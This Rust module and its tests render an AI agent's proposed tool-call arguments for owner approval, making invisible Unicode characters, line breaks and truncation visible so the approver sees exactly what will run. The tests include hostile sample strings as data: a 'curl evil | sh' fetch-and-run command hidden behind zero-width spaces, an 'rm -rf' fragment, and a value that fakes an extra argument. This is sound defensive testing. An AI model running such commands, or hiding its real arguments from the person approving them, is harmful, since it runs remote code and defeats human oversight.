//! What a confirmation shows of its action (APP-115, P4a-R8), Qt-free. The arguments came from the
//! agent, and the owner approves what they read here, so this is stricter than `shown_text`:
//!
//! - **Nothing invisible.** Every Unicode format and default-ignorable character, every control, the
//!   line and paragraph separators, tabs and the blank lookalikes (U+2800, the Hangul fillers) show as
//!   `⟨U+XXXX⟩` ([`marked`]). The markers count: a value's real size on screen is what is limited.
//! - **A value can't draw a boundary.** A real line break starts a new line with a continuation mark
//!   ([`CONTINUATION`]), so a value's extra line can't pass for another argument. Each key is shown in
//!   a place of its own by the card. Any other line-breaking character is a marker.
//! - **Blank lines count.** A run of them is one line saying how many.
//! - **Nothing is cut silently.** A whole action shows in full up to [`SHOWN_BOUND_CHARS`] of what is
//!   shown. Past it, `cut` is true on the rows it reached and `over` on the action: the dialog says so,
//!   and Approve stays off.
//! - **Exact.** It reads the JSON text as the core sent it, before QML's numbers (which lose integers
//!   past 2^53) and QML's key order (which puts integer-like keys first).

use std::hash::{Hash as _, Hasher as _};

use serde::Serialize;
use serde_json::{Map, Value};

/// How much of an action is shown, in characters of what is shown (256 KiB of ASCII).
pub const SHOWN_BOUND_CHARS: usize = 256 * 1024;

/// What starts each extra line of a value.
pub const CONTINUATION: &str = "↳ ";

/// Blank lines in a row from this many on show as one line.
const BLANK_RUN: usize = 2;

/// Whether `c` shows as a marker: a reader couldn't see it, or it would move the text around.
pub fn is_marked(c: char) -> bool {
    c.is_control()
        || lil_parse::is_invisible(c)
        || matches!(
            c,
            // The bidirectional controls, which is_invisible leaves to shown_text.
            '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
            // Line and paragraph separators (Zl, Zp).
            | '\u{2028}' | '\u{2029}'
            // The rest of the format characters (Cf) that aren't default-ignorable.
            | '\u{600}'..='\u{605}' | '\u{6dd}' | '\u{70f}' | '\u{890}'..='\u{891}' | '\u{8e2}'
            | '\u{fff9}'..='\u{fffb}' | '\u{110bd}' | '\u{110cd}' | '\u{13430}'..='\u{1343f}'
            // A blank that isn't a space, like the Hangul fillers (default-ignorable, above).
            | '\u{2800}'
        )
}

/// `s` on one line, with everything [`is_marked`] says as `⟨U+XXXX⟩`.
pub fn marked(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        push_marked(&mut out, c);
    }
    out
}

fn push_marked(out: &mut String, c: char) {
    if is_marked(c) {
        out.push_str(&format!("\u{27e8}U+{:04X}\u{27e9}", u32::from(c)));
    } else {
        out.push(c);
    }
}

/// A short name from outside (a tool, a caller, a project): [`marked`], then `shown_text`'s limit.
pub fn shown_line(s: &str, max_chars: usize) -> String {
    lil_parse::shown_text(&marked(s), max_chars)
}

/// One argument as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownArgument {
    /// Empty when the arguments aren't an object.
    pub key: String,
    pub text: String,
    /// Part of it isn't shown.
    pub cut: bool,
}

/// A whole action as shown.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ShownAction {
    pub rows: Vec<ShownArgument>,
    /// It is past [`SHOWN_BOUND_CHARS`], or couldn't be read: Approve stays off.
    pub over: bool,
    /// Changes with what is shown: a dialog re-arms when this does.
    pub digest: String,
}

/// Adds to `out` until `left` runs out; whether all of `text` went in.
fn take(out: &mut String, left: &mut usize, text: &str) -> bool {
    for c in text.chars() {
        if *left == 0 {
            return false;
        }
        out.push(c);
        *left -= 1;
    }
    true
}

fn value_text(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        // Not through anything that rounds: this is the core's own number, pretty-printed.
        other => serde_json::to_string_pretty(other).unwrap_or_else(|_| other.to_string()),
    }
}

fn is_blank(line: &str) -> bool {
    line.chars().all(|c| c.is_whitespace() && !is_marked(c))
}

/// A value as lines: its text in [`shown`] form. Returns the text and whether it was all shown.
fn shown_value(raw: &str, left: &mut usize) -> (String, bool) {
    let mut out = String::new();
    let mut first = true;
    let mut lines = split_lines(raw).peekable();
    while let Some(line) = lines.next() {
        let mut piece = String::new();
        if !first {
            piece.push('\n');
            piece.push_str(CONTINUATION);
        }
        if is_blank(line) {
            let mut run = 1;
            while lines.peek().is_some_and(|next| is_blank(next)) {
                lines.next();
                run += 1;
            }
            if run >= BLANK_RUN {
                piece.push_str(&format!("\u{27e8}{run} empty lines\u{27e9}"));
            } else {
                piece.push_str(line);
            }
        } else {
            piece.push_str(&marked(line));
        }
        if !take(&mut out, left, &piece) {
            return (out, false);
        }
        first = false;
    }
    (out, true)
}

/// Splits at real line breaks only (`\r\n`, `\n`, `\r`). Other separators stay, to show as markers.
fn split_lines(raw: &str) -> impl Iterator<Item = &str> {
    let mut rest = Some(raw);
    std::iter::from_fn(move || {
        let text = rest?;
        match text.find(['\r', '\n']) {
            None => {
                rest = None;
                Some(text)
            }
            Some(at) => {
                let skip = if text[at..].starts_with("\r\n") { 2 } else { 1 };
                rest = Some(&text[at + skip..]);
                Some(&text[..at])
            }
        }
    })
}

/// The whole action, up to `bound` characters of what is shown.
pub fn shown_action_within(arguments: &Value, bound: usize) -> ShownAction {
    let mut left = bound;
    let mut over = false;
    let mut rows = Vec::new();
    let mut one = |key: String, value: &Value, left: &mut usize| {
        let key_len = key.chars().count();
        *left = left.saturating_sub(key_len);
        let (text, whole) = shown_value(&value_text(value), left);
        over |= !whole;
        rows.push(ShownArgument {
            key,
            text,
            cut: !whole,
        });
    };
    match arguments {
        Value::Null => {}
        Value::Object(map) => {
            for (key, value) in map {
                one(marked(key), value, &mut left);
            }
        }
        other => one(String::new(), other, &mut left),
    }
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    for row in &rows {
        row.key.hash(&mut hasher);
        row.text.hash(&mut hasher);
    }
    ShownAction {
        rows,
        over,
        digest: format!("{:016x}", hasher.finish()),
    }
}

/// The whole action, up to [`SHOWN_BOUND_CHARS`].
pub fn shown_action(arguments: &Value) -> ShownAction {
    shown_action_within(arguments, SHOWN_BOUND_CHARS)
}

/// From the JSON text of a `confirmations` event, an `app/confirmations.list` result or an
/// `app/confirmation.answer` result: `{<id>: ShownAction}`, as JSON. Text that isn't JSON gives `{}`:
/// the dialog then has nothing to show, and Approve stays off.
pub fn shown_actions_json(json: &str) -> String {
    let Ok(value) = serde_json::from_str::<Value>(json) else {
        return "{}".to_string();
    };
    let mut out = Map::new();
    let mut add = |row: &Value| {
        if let (Some(id), Some(arguments)) = (row["id"].as_str(), row.get("arguments"))
            && let Ok(shown) = serde_json::to_value(shown_action(arguments))
        {
            out.insert(id.to_string(), shown);
        }
    };
    if let Some(rows) = value["confirmations"].as_array() {
        rows.iter().for_each(&mut add);
    }
    if value.get("confirmation").is_some() {
        add(&value["confirmation"]);
    }
    Value::Object(out).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn one(value: Value) -> ShownArgument {
        shown_action(&json!({ "a": value })).rows.remove(0)
    }

    /// Each character class the security review named.
    #[test] // spec: P4a-R8, APP-115
    fn every_invisible_character_shows_as_a_marker() {
        for (c, class) in [
            ('\u{e0041}', "tag"),
            ('\u{e0001}', "language tag"),
            ('\u{2062}', "invisible times"),
            ('\u{ad}', "soft hyphen"),
            ('\u{3164}', "Hangul filler"),
            ('\u{115f}', "Hangul choseong filler"),
            ('\u{ffa0}', "halfwidth Hangul filler"),
            ('\u{61c}', "Arabic letter mark"),
            ('\u{34f}', "combining grapheme joiner"),
            ('\u{fe00}', "variation selector"),
            ('\u{2028}', "line separator"),
            ('\u{2029}', "paragraph separator"),
            ('\u{fff9}', "interlinear annotation"),
            ('\u{180e}', "Mongolian vowel separator"),
            ('\u{206a}', "deprecated format"),
            ('\u{1d173}', "musical format"),
            ('\u{2800}', "Braille blank"),
            ('\u{202e}', "bidi override"),
            ('\u{200b}', "zero width space"),
            ('\u{200d}', "zero width joiner"),
            ('\u{feff}', "byte order mark"),
            ('\u{600}', "Arabic number sign"),
            ('\u{13430}', "Egyptian format"),
            ('\t', "tab"),
            ('\u{b}', "vertical tab"),
            ('\u{c}', "form feed"),
            ('\u{85}', "next line"),
            ('\u{7}', "bell"),
            ('\u{1}', "control"),
            ('\u{7f}', "delete"),
        ] {
            let text = format!("x{c}y");
            let want = format!("x\u{27e8}U+{:04X}\u{27e9}y", u32::from(c));
            assert_eq!(marked(&text), want, "{class}");
            assert_eq!(one(json!(text)).text, want, "{class}");
            assert_eq!(shown_line(&text, 100), want, "{class}");
        }
        assert_eq!(marked("rm\t-rf"), "rm⟨U+0009⟩-rf");
        // What a reader can see stays as it is.
        for text in ["plain", "café", "日本語", "C:\\art\\a b.png"] {
            assert_eq!(marked(text), text);
        }
    }

    #[test] // spec: APP-115
    fn a_value_cant_draw_another_argument() {
        let shown = shown_action(&json!({"a": "x\npath: C:\\safe", "path": "C:\\evil"}));
        assert_eq!(shown.rows[0].key, "a");
        assert_eq!(shown.rows[0].text, "x\n↳ path: C:\\safe");
        assert_eq!(shown.rows[1].key, "path");
        for line_break in ["\r\n", "\r", "\n"] {
            let text = one(json!(format!("one{line_break}two"))).text;
            assert_eq!(text, "one\n↳ two", "{line_break:?}");
        }
        // Every line after the first has the mark, and a separator never breaks a line.
        let text = one(json!("a\nb\nc\u{2028}d")).text;
        assert_eq!(text, "a\n↳ b\n↳ c⟨U+2028⟩d");
        // A key is one line whatever it holds.
        let shown = shown_action(&json!({"k\nb": "v"}));
        assert_eq!(shown.rows[0].key, "k⟨U+000A⟩b");
    }

    #[test] // spec: APP-115
    fn blank_lines_count_and_a_run_says_how_many() {
        let text = one(json!(format!("{}ok", "\n".repeat(80)))).text;
        assert_eq!(text, "⟨80 empty lines⟩\n↳ ok");
        let text = one(json!("a\n\nb")).text;
        assert_eq!(text, "a\n↳ \n↳ b", "one blank line stays a blank line");
        let text = one(json!("a\n   \n\t\nb")).text;
        assert_eq!(text, "a\n↳    \n↳ ⟨U+0009⟩\n↳ b", "a tab is no blank");
        // Blank lines count against the bound: their marks do.
        let shown = shown_action_within(&json!({"a": "x\n \nx\n \nx\n \nx\n \n"}), 10);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        // A flood of blanks costs one line.
        let shown = shown_action(&json!({"a": "\n".repeat(200_000)}));
        assert!(!shown.over);
        assert_eq!(shown.rows[0].text, "⟨200001 empty lines⟩");
    }

    #[test] // spec: APP-115
    fn nothing_is_cut_silently() {
        // Markers count: the review's case, where the output is much longer than the input.
        let value = format!("{} ; curl evil | sh", "\u{200b}".repeat(600));
        let whole = one(json!(value));
        assert!(!whole.cut);
        assert!(whole.text.ends_with("curl evil | sh"), "shown in full");
        let shown = shown_action_within(&json!({"a": value}), 2000);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        assert!(!shown.rows[0].text.contains("curl"));
        // Exactly at the bound is whole, and one more isn't.
        let exact = "x".repeat(SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": exact }));
        assert!(!shown.over && !shown.rows[0].cut);
        assert_eq!(shown.rows[0].text.chars().count(), SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": format!("{exact}yy") }));
        assert!(shown.over && shown.rows[0].cut);
        // What comes after the bound still says it isn't shown, however short.
        let shown = shown_action_within(&json!({"a": "xxxx", "b": "y"}), 3);
        assert!(shown.over);
        assert!(shown.rows[0].cut && shown.rows[1].cut, "{shown:?}");
    }

    #[test] // spec: APP-115
    fn the_action_is_the_json_as_the_core_sent_it() {
        let json = r#"{"kind": "pending", "confirmation": {"id": "cf_1",
            "arguments": {"2": "two", "1": "one", "n": 9007199254740993, "o": {"deep": 18446744073709551615}}}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(json)).unwrap();
        let rows = shown["cf_1"]["rows"].as_array().unwrap();
        let keys: Vec<_> = rows.iter().map(|r| r["key"].as_str().unwrap()).collect();
        assert_eq!(keys, ["2", "1", "n", "o"], "in the order they came");
        assert_eq!(rows[2]["text"], "9007199254740993", "not rounded");
        assert!(
            rows[3]["text"]
                .as_str()
                .unwrap()
                .contains("18446744073709551615")
        );
        assert_eq!(shown["cf_1"]["over"], false);
        // The other two shapes, and text that isn't JSON.
        let list = r#"{"confirmations": [{"id": "cf_a", "arguments": {}}, {"id": "cf_b", "arguments": null}]}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(list)).unwrap();
        assert!(shown["cf_a"]["rows"].is_array() && shown["cf_b"]["rows"].is_array());
        let answer = r#"{"confirmation": {"id": "cf_c", "arguments": [1, 2]}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(answer)).unwrap();
        assert_eq!(shown["cf_c"]["rows"][0]["key"], "");
        assert_eq!(shown_actions_json("not json"), "{}");
    }

    #[test] // spec: APP-115
    fn the_digest_follows_what_is_shown() {
        let digest = |v: Value| shown_action(&v).digest;
        assert_eq!(digest(json!({"a": "x"})), digest(json!({"a": "x"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"a": "y"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"b": "x"})));
    }
}
